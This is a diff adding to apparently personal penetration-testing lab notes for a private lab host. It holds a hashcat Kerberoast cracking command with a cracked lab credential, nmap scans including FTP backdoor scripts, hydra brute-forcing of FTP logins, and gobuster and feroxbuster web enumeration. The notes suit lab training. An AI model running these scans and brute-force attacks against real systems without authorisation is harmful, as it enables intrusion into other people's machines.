@@ -111,3 +111,35 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule
 
 # sql_svc - Dolphin1
 ```
+.149
+```
+wget https://github.com/superkojiman/onetwopunch/raw/master/onetwopunch.sh
+nmap -sT -A -p 21,22,80 192.168.211.149
+sudo ./onetwopunch.sh -t lab2/149.txt tcp
+sudo nmap 192.168.211.149 -sU
+
+# 80,21,22 open
+
+# enumerate ftp
+nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.211.149
+
+# format of wordlist is user:password, so use -C option
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.211.149 ftp
+
+# source /usr/share/sparta/wordlists/ftp-default-userpass.txt 
+hydra -s 21 -C ftp-wordlist.txt 192.168.211.149 ftp
+
+nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN ftp 192.168.211.149
+
+# enumerate webserver
+sudo nmap -O 192.168.211.149 --osscan-guess
+sudo nmap --script http-enum 192.168.211.149
+whatweb http://192.168.211.149
+gobuster dir -u http://192.168.211.149 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --url http://192.168.211.149 --filter-status=200,301,403
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/apache.txt --url http://192.168.211.149 --filter-status=200,301,403
+
+# enumerate ssh
+
+
+```
